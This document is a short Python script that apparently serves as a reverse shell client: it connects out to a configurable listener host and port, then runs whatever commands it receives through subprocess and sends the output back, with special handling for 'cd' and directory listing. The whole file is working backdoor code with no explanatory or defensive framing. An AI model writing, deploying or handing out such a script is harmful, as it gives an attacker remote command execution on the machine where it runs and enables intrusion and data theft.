import socket
import subprocess
import shlex
import os
import sys

#change this to the socket you're listening on
HOST = '127.0.0.1'
PORT = 5555


def connect(host, port):
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((host, port))
        return sock

    except socket.error as e:
        #print(f'[!] Exception during socket setup: {e}')
        sock.close()
        sys.exit(1)
        


def run_command(cmd):
    cmd = cmd.strip()
    if not cmd:
        return '\n'
    
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output



def recieve(sock):


    while True:
        raw_bytes = sock.recv(1024)

        if len(raw_bytes):

            try:        
                #if a directory change needs to be performed
                if raw_bytes[:2].decode('utf-8') == 'cd':
                    os.chdir(raw_bytes[3:].decode('utf-8'))            
                    sock.send('changed directory.'.encode())

                elif raw_bytes[:3].decode() == 'dir' or raw_bytes[:2].decode() == 'ls':
                        
                    script_directory = os.getcwd()
                    files = os.listdir(script_directory)
                    
                    sock.send('\n'.join(files).encode())
                
                else:
                    cmd = raw_bytes[:].decode('utf-8')
                    res = run_command(cmd)
                    
                    #res will be ascii in this case so no need to encode
                    sock.send(res) 
            
            except Exception as e:
                sock.send(f'[!] Exception: {e}'.encode())

    
if __name__ == '__main__':
    sock = connect(HOST, PORT)
    recieve(sock)